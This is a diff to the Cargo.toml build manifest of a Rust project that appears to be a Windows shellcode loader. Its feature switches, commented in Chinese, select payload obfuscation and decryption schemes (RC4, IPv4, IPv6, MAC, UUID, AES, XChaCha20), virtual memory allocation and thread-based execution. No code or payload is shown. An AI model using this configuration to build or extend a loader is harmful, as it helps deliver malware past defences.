@@ -8,6 +8,7 @@ edition = "2021"
 [dependencies]
 tempfile = "3.10.1"
 base64 = "0.21.5"
+base32 = "0.5.1"
 windows-sys = { version = "0.42.0", features = ["Win32_System_Memory", "Win32_Foundation", "Win32_System_Threading", "Win32_System_LibraryLoader"] }
 winreg = "0.52.0"
 uuid = { version = "1.0", features = ["v4"] }
@@ -34,17 +35,19 @@ chacha20poly1305 = "0.10"
 embed-resource = "1.8.0"
 
 [features]
-default = ["decrypt_ipv4", "alloc_mem_va", "run_create_thread"]
+default = ["decrypt_ipv4", "alloc_mem_va", "run_create_thread", "none_decode"]
 
 # 解密算法特性开关
+none_decode = []
 base64_decode = []
-decrypt_rc4 = ["base64_decode"]                # 启用RC4解密
-decrypt_ipv4 = ["base64_decode"]               # 启用IPv4解密
-decrypt_ipv6 = ["base64_decode"]               # 启用IPv6解密
-decrypt_mac = ["base64_decode"]                # 启用MAC解密
-decrypt_uuid = ["base64_decode"]               # 启用UUID解密
-decrypt_aes = ["base64_decode"]                # 启用AES解密
-decrypt_xchacha20 = ["base64_decode"]          # 启用XChaCha20-Poly1305解密
+base32_decode = []
+decrypt_rc4 = []                # 启用RC4解密
+decrypt_ipv4 = []               # 启用IPv4解密
+decrypt_ipv6 = []               # 启用IPv6解密
+decrypt_mac = []                  # 启用MAC解密
+decrypt_uuid = []               # 启用UUID解密
+decrypt_aes = []                # 启用AES解密
+decrypt_xchacha20 = []          # 启用XChaCha20-Poly1305解密
 
 # 内存分配方式
 alloc_mem_va = []
